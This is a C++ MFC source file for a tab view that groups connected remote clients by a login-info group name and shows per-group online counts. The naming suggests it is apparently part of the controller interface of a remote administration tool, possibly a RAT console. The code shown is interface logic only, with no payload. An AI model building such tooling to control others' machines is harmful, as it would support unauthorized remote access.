// ClientView.cpp : implementation of the CTabView class
//

#include "stdafx.h"
#include "Quick.h"

#include "QuickDoc.h"
#include "QuickView.h"
#include "TabView.h"
#include "MainFrm.h"
#include "InputDlg.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#endif
#define IDC_TABCONTROL 100

CTabView* g_pTabView;

extern CMainFrame* g_pFrame;
/////////////////////////////////////////////////////////////////////////////
// CTabView

IMPLEMENT_DYNCREATE(CTabView, CView)

BEGIN_MESSAGE_MAP(CTabView, CView)
	//{{AFX_MSG_MAP(CTabView)
	ON_WM_CREATE()
	ON_WM_ERASEBKGND()
	ON_WM_CONTEXTMENU()
	ON_WM_SIZE()
	//}}AFX_MSG_MAP
	ON_NOTIFY(TCN_SELCHANGE, IDC_TABCONTROL, OnSelectedChanged)
	ON_MESSAGE(WM_ADDFINDGROUP, OnAddFindGroup)

END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CTabView construction/destruction

CTabView::CTabView()
{
	// TODO: add construction code here
	g_pTabView = this;
}

CTabView::~CTabView()
{

}

BOOL CTabView::PreCreateWindow(CREATESTRUCT& cs)
{
	// TODO: Modify the Window class or styles here by modifying
	//  the CREATESTRUCT cs
	cs.style &= ~WS_BORDER;
	return CView::PreCreateWindow(cs);
}

/////////////////////////////////////////////////////////////////////////////
// CTabView drawing

void CTabView::OnDraw(CDC* pDC)
{
	CQuickDoc* pDoc = GetDocument();
	ASSERT_VALID(pDoc);
	// TODO: add draw code for native data here
}

/////////////////////////////////////////////////////////////////////////////
// CTabView diagnostics

#ifdef _DEBUG
void CTabView::AssertValid() const
{
	CView::AssertValid();
}

void CTabView::Dump(CDumpContext& dc) const
{
	CView::Dump(dc);
}

CQuickDoc* CTabView::GetDocument() // non-debug version is inline
{
	ASSERT(m_pDocument->IsKindOf(RUNTIME_CLASS(CQuickDoc)));
	return (CQuickDoc*)m_pDocument;
}
#endif //_DEBUG

/////////////////////////////////////////////////////////////////////////////
// CTabView message handlers

int CTabView::OnCreate(LPCREATESTRUCT lpCreateStruct)
{
	if (CView::OnCreate(lpCreateStruct) == -1)
		return -1;

	// TODO: Add your specialized creation code here
	m_wndTabControl.Create(WS_CHILD | WS_VISIBLE | WS_CLIPCHILDREN | WS_CLIPSIBLINGS, CRect(0, 0, 0, 0), this, IDC_TABCONTROL);
	m_wndTabControl.GetPaintManager()->SetAppearance(xtpTabAppearanceExcel);
	m_wndTabControl.GetPaintManager()->m_bHotTracking = TRUE;
	m_wndTabControl.SetPosition(xtpTabPositionBottom);
	m_wndTabControl.SetColor(xtpTabColorOffice2003);

	m_wndTabControl.GetPaintManager()->DisableLunaColors(TRUE);


	return 0;
}

BOOL CTabView::AddGroup(LPCTSTR lpszTitle)
{
	return  AddView(RUNTIME_CLASS(CQuickView), lpszTitle);
}


BOOL CTabView::AddView(CRuntimeClass* pViewClass, LPCTSTR lpszTitle)
{
	CCreateContext contextT;
	contextT.m_pCurrentDoc = GetDocument();
	contextT.m_pNewViewClass = pViewClass;
	contextT.m_pNewDocTemplate = GetDocument()->GetDocTemplate();

	CWnd* pWnd;
	TRY
	{
		pWnd = (CWnd*)pViewClass->CreateObject();
		if (pWnd == NULL)
		{
			AfxThrowMemoryException();
		}
	}
		CATCH_ALL(e)
	{
		TRACE0("Out of memory creating a view.\n");
		// Note: DELETE_EXCEPTION(e) not required
		return FALSE;
	}
	END_CATCH_ALL

		DWORD dwStyle = AFX_WS_DEFAULT_VIEW;
	dwStyle &= ~WS_BORDER;

	int nTab = m_wndTabControl.GetItemCount();

	// Create with the right size (wrong position)
	CRect rect(0, 0, 0, 0);
	if (!pWnd->Create(NULL, NULL, dwStyle,
		rect, &m_wndTabControl, (AFX_IDW_PANE_FIRST + nTab), &contextT))
	{
		TRACE0("Warning: couldn't create client tab for view.\n");
		// pWnd will be cleaned up by PostNcDestroy
		return NULL;
	}
	m_wndTabControl.InsertItem(nTab, lpszTitle, pWnd->GetSafeHwnd());

	pWnd->SetOwner(this);

	return TRUE;
}

void CTabView::UpdateDocTitle()
{
	GetDocument()->UpdateFrameCounts();
}


void CTabView::OnSelectedChanged(NMHDR* pNMHDR, LRESULT* pResult)
{
	UNUSED_ALWAYS(pNMHDR);
	*pResult = 0;
	g_pFrame->m_wndTip.Hide();
	UpdateDocTitle();

	CFrameWnd* pFrame = GetParentFrame();
	CView* pView = DYNAMIC_DOWNCAST(CView, CWnd::FromHandle(m_wndTabControl.GetSelectedItem()->GetHandle()));
	ASSERT_KINDOF(CView, pView);

	pFrame->SetActiveView(pView);
}

LRESULT CTabView::OnAddFindGroup(WPARAM wParam, LPARAM lParam)
{
	ClientContext* pContext = (ClientContext*)lParam;
	if (pContext == NULL)
		return -1;
	try
	{
		if (!pContext->LoginInfo)
		{
			pContext->LoginInfo = new LOGININFO;
			if (!pContext->LoginInfo)  
			{
				log_严重("OnAddFindGroup  new LOGININFO;");
				return -1;
			}
			if (pContext->m_DeCompressionBuffer.GetBufferLen() == sizeof(LOGININFO))
			{
				if ((pContext->LoginInfo == NULL) || (pContext->IsConnect != 666))
				{
					log_严重("OnAddFindGroup");
					return -1;
				}
				memcpy(pContext->LoginInfo, pContext->m_DeCompressionBuffer.GetBuffer(), sizeof(LOGININFO));
			}
			else
			{
				return -1;
			}
		}

		BOOL bFind = false;
		CString strGroupName, strTemp;

		int nTabs = m_wndTabControl.GetItemCount();
		for (int i = 0; i < nTabs; i++)
		{
			strTemp = m_wndTabControl.GetItem(i)->GetCaption();
			int n = strTemp.ReverseFind('(');
			if (n > 0)
			{
				strGroupName = strTemp.Left(n);
			}
			else
			{
				strGroupName = strTemp;
			}

			if (lstrlen(pContext->LoginInfo->Group) == NULL)
			{
				lstrcpy(pContext->LoginInfo->Group, _T("默认"));//默认分组
			}

			if (strGroupName == pContext->LoginInfo->Group)
			{
				bFind = true;
				CQuickView* pView = DYNAMIC_DOWNCAST(CQuickView, CWnd::FromHandle(m_wndTabControl.GetItem(i)->GetHandle()));
				pView->PostMessage(WM_ADDTOMAINLIST, 0, (LPARAM)pContext);
				return 0;
			}
		}
		if (!bFind)
		{
			strGroupName.Format(_T("%s(1)"), pContext->LoginInfo->Group);
			AddGroup(strGroupName);
			CQuickView* pView = DYNAMIC_DOWNCAST(CQuickView, CWnd::FromHandle(m_wndTabControl.GetItem(nTabs)->GetHandle()));
			pView->OnInitialUpdate();
			pView->PostMessage(WM_ADDTOMAINLIST, 0, (LPARAM)pContext);
		}
	}
	catch (...) {}
	return 0;
}


BOOL CTabView::UpDateNumber()
{
	CString strGroupName, strTemp;
	int nTabs = m_wndTabControl.GetItemCount();

	for (int i = 0; i < nTabs; i++)
	{
		CXTPTabManagerItem* pRightItem = m_wndTabControl.GetItem(i);
		if (!pRightItem) continue;;

		strTemp = m_wndTabControl.GetItem(i)->GetCaption();
		int n = strTemp.ReverseFind('(');
		if (n > 0)
		{
			strGroupName = strTemp.Left(n);
		}
		else
		{
			strGroupName = strTemp;
		}
		CQuickView* pView = DYNAMIC_DOWNCAST(CQuickView, CWnd::FromHandle(m_wndTabControl.GetItem(i)->GetHandle()));
		if (pView->wndReport->GetRecords()->GetCount() == 0 && strGroupName != _T("默认"))
		{
			pRightItem->Remove();
			pView->DestroyWindow();
			continue;
		}
		int a = pView->wndReport->GetRecords()->GetCount();
		if (a > ONLINE_NUM) exit(0);
		strTemp.Format(_T("%s(%d)"), strGroupName, a);
		m_wndTabControl.GetItem(i)->SetCaption(strTemp);
	}
	return TRUE;
}

BOOL CTabView::OnEraseBkgnd(CDC* pDC)
{
	// TODO: Add your message handler code here and/or call default
	return TRUE;
	//	return CView::OnEraseBkgnd(pDC);
}

void CTabView::OnContextMenu(CWnd* pWnd, CPoint point)
{
	// TODO: Add your message handler code here

}

void CTabView::OnSize(UINT nType, int cx, int cy)
{
	CView::OnSize(nType, cx, cy);

	// TODO: Add your message handler code here
	if (m_wndTabControl.GetSafeHwnd())
	{
		m_wndTabControl.MoveWindow(0, 0, cx, cy);
	}
}

